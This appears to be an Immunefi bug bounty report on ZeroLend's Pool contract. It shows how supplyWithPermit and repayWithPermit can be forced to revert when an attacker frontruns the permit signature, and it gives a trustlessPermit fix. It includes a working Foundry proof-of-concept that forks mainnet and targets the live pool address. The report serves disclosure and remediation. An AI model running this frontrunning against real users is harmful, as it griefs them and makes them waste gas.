# 28943 - \[SC - Medium] DoS when user want to supply repay asset using...

Submitted on Mar 2nd 2024 at 14:40:11 UTC by @savi0ur for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)

Report ID: #28943

Report type: Smart Contract

Report severity: Medium

Target: <https://pacific-explorer.manta.network/address/0x2f9bB73a8e98793e26Cb2F6C4ad037BDf1C6B269>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Bug Description

The Underlying ERC20 token of the Pool contract incorporates the [EIP-2612 permit](https://eips.ethereum.org/EIPS/eip-2612), allowing users to off-chain sign permits for gas-less transfers. However, the open Zeppelin's design choice introduces a frontrunning risk, where any entity can execute the `permit()` function before the original transaction, causing potential issues, especially when used within other functions.

The `supplyWithPermit()` function, while introducing a permit-first approach, creates vulnerability to frontrunning, resulting in a brief Denial of Service (DOS) situation.

```solidity
 function supplyWithPermit(
	address asset,
	uint256 amount,
	address onBehalfOf,
	uint16 referralCode,
	uint256 deadline,
	uint8 permitV,
	bytes32 permitR,
	bytes32 permitS
) public virtual override {
	IERC20WithPermit(asset).permit(
		msg.sender,
		address(this),
		amount,
		deadline,
		permitV,
		permitR,
		permitS
	);
	SupplyLogic.executeSupply(
		_reserves,
		_reservesList,
		_usersConfig[onBehalfOf],
		DataTypes.ExecuteSupplyParams({
			asset: asset,
			amount: amount,
			onBehalfOf: onBehalfOf,
			referralCode: referralCode
		})
	);
}
```

### Attack Scenario

1. Alice sign the tx off-chain and submit it to perform `supplyWithPermit`
2. While the Alice tx is in mempool, Bob `(Attacker)` can see it, frontrun it, and execute `permit` directly on the underlying token with all the message and signature details of Alice.
3. Alice's tx now executes after Bob's tx and it will get reverted as the signature is already used.

## Impact

Any function call that unconditionally performs `permit()` can be forced to revert this way. In case there is a fallback code path (using direct user approval), the DOS is short-term, as eventually the user / dApp would switch to using an alternative. Otherwise, the DOS is long-term.

I'm marking this issue as **Medium** according to [Immunefi's vulnerability classification system](https://immunefi.com/immunefi-vulnerability-severity-classification-system-v2-3/) : Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol).

> **Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol):** Griefing is when the attacker calls certain functions of the smart contract that would put it in a suboptimal state, thus blocking normal function execution for any user. This would cause the user to lose money for sending the transaction, but when the smart contract is back to normal, the user would be able to call the function once again to complete it. In this instance, the attacker damaged the user by requiring them to send another transaction. The attacker does not profit, but they do damage the users or the protocol.

**NOTE:** There is one more function - `repayWithPermit()` which is vulnerable to same attack.

## Risk Breakdown

Difficulty to Exploit: Easy

## Recommendation

It is recommended to use below `trustlessPermit()` in all the places where `permit()` is used within other functions.

```solidity
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Permit.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

library TrustlessPermit {
    function trustlessPermit(
        address token,
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) internal {
        // Try permit() before allowance check to advance nonce if possible
        try IERC20Permit(token).permit(owner, spender, value, deadline, v, r, s) {
            return;
        } catch {
            // Permit potentially got frontran. Continue anyways if allowance is sufficient.
            if (IERC20(token).allowance(owner, spender) >= value) {
                return;
            }
        }
        revert("Permit failure");
    }
}
```

```diff
function supplyWithPermit(
    address asset,
    uint256 amount,
    address onBehalfOf,
    uint16 referralCode,
    uint256 deadline,
    uint8 permitV,
    bytes32 permitR,
    bytes32 permitS
) public virtual override {
-   IERC20WithPermit(asset).permit(
-       msg.sender,
-       address(this),
-       amount,
-       deadline,
-       permitV,
-       permitR,
-       permitS
-   );
+   TrustlessPermit.trustlessPermit(
+       asset, 
+       msg.sender, 
+       address(this), 
+       amount, 
+       deadline, 
+       permitV, 
+       permitR, 
+       permitS
+  );
    SupplyLogic.executeSupply(
        _reserves,
        _reservesList,
        _usersConfig[onBehalfOf],
        DataTypes.ExecuteSupplyParams({
            asset: asset,
            amount: amount,
            onBehalfOf: onBehalfOf,
            referralCode: referralCode
        })
    );
}
```

## References

* Proxy - <https://pacific-explorer.manta.network/address/0x2f9bB73a8e98793e26Cb2F6C4ad037BDf1C6B269>
* Implementation - <https://pacific-explorer.manta.network/address/0x8676e39B5D2f0d6E0d78a4208a0cCBc50504972e>
* Proxy - <https://explorer.zksync.io/address/0x4d9429246EA989C9CeE203B43F6d1C7D83e3B8F8#contract>
* Implementation - <https://explorer.zksync.io/address/0x54d6f91be4509826559ad12e1ca6ca3a6c3811e0#contract>

## Proof Of Concept

**Steps to Run using Foundry:**

* Install Foundry (<https://book.getfoundry.sh/getting-started/installation>)
* Open terminal and run `forge init poc` and `cd poc`
* Paste following foundry code in `PoC.t.sol`
* Run using `forge test -vv`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/interfaces/IERC20.sol";

interface IPool {
    function repayWithPermit(
        address asset,
        uint256 amount,
        uint256 interestRateMode,
        address onBehalfOf,
        uint256 deadline,
        uint8 permitV,
        bytes32 permitR,
        bytes32 permitS
    ) external returns (uint256);
    function supplyWithPermit(
        address asset,
        uint256 amount,
        address onBehalfOf,
        uint16 referralCode,
        uint256 deadline,
        uint8 permitV,
        bytes32 permitR,
        bytes32 permitS
    ) external;
}

interface IAToken {
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external view returns (bytes32);
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
}

contract POC is Test {
    IPool pool = IPool(0x2f9bB73a8e98793e26Cb2F6C4ad037BDf1C6B269);
    
    function testDoSWithPermitPOC() public {
        vm.createSelectFork('https://1rpc.io/manta');
        vm.label(address(pool), "Pool");

        address aToken_addr = 0xB4FFEf15daf4C02787bC5332580b838cE39805f5;
        vm.label(aToken_addr, "aToken");
        
        IAToken aToken = IAToken(aToken_addr);

        (address user, uint256 userPrivateKey) = makeAddrAndKey("USER");
        uint256 amount = 10 ether;

        address attacker = makeAddr("ATTACKER");
        
        console.log("USER want to supply asset with permit on behalf of some user and prepares signature off-chain and submit `supplyWithPermit()` tx");
        SigUtils sigUtils = new SigUtils(aToken.DOMAIN_SEPARATOR());
        SigUtils.Permit memory permit = SigUtils.Permit({
            owner: user,
            spender: address(pool),
            value: amount,
            nonce: 0,
            deadline: block.timestamp
        });
        bytes32 digest = sigUtils.getTypedDataHash(permit);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, digest);

        console.log("While `supplyWithPermit()` tx is in mempool, Attacker frontrun user's supplyWithPermit tx");
        vm.startPrank(attacker);
        aToken.permit(
            permit.owner, 
            permit.spender, 
            permit.value, 
            permit.deadline,
            v,
            r, 
            s
        );
        console.log("Frontrun completed");
        vm.stopPrank();

        vm.startPrank(user);
        console.log("USER's `supplyWithPermit()` tx now get executed but gets reverted as signature is already used");
        vm.expectRevert(); //ERC20Permit: invalid signature
        pool.supplyWithPermit(
            aToken_addr, 
            permit.value, 
            user, 
            0, 
            permit.deadline, 
            v, 
            r, 
            s
        );
        vm.stopPrank();
    }
}

contract SigUtils {
    bytes32 internal DOMAIN_SEPARATOR;

    constructor(bytes32 _DOMAIN_SEPARATOR) {
        DOMAIN_SEPARATOR = _DOMAIN_SEPARATOR;
    }

    // keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");
    bytes32 public constant PERMIT_TYPEHASH =
        0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;

    struct Permit {
        address owner;
        address spender;
        uint256 value;
        uint256 nonce;
        uint256 deadline;
    }

    // computes the hash of a permit
    function getStructHash(Permit memory _permit)
        internal
        pure
        returns (bytes32)
    {
        return
            keccak256(
                abi.encode(
                    PERMIT_TYPEHASH,
                    _permit.owner,
                    _permit.spender,
                    _permit.value,
                    _permit.nonce,
                    _permit.deadline
                )
            );
    }

    // computes the hash of the fully encoded EIP-712 message for the domain, which can be used to recover the signer
    function getTypedDataHash(Permit memory _permit)
        public
        view
        returns (bytes32)
    {
        return
            keccak256(
                abi.encodePacked(
                    "\x19\x01",
                    DOMAIN_SEPARATOR,
                    getStructHash(_permit)
                )
            );
    }
}
```

**Console Output:**

```console
[PASS] testDoSWithPermitPOC() (gas: 262040)
Logs:
  USER want to supply asset with permit on behalf of some user and prepares signature off-chain and submit `supplyWithPermit()` tx
  While `supplyWithPermit()` tx is in mempool, Attacker frontrun user's supplyWithPermit tx
  Frontrun completed
  USER's `supplyWithPermit()` tx now get executed but gets reverted as signature is already used

```
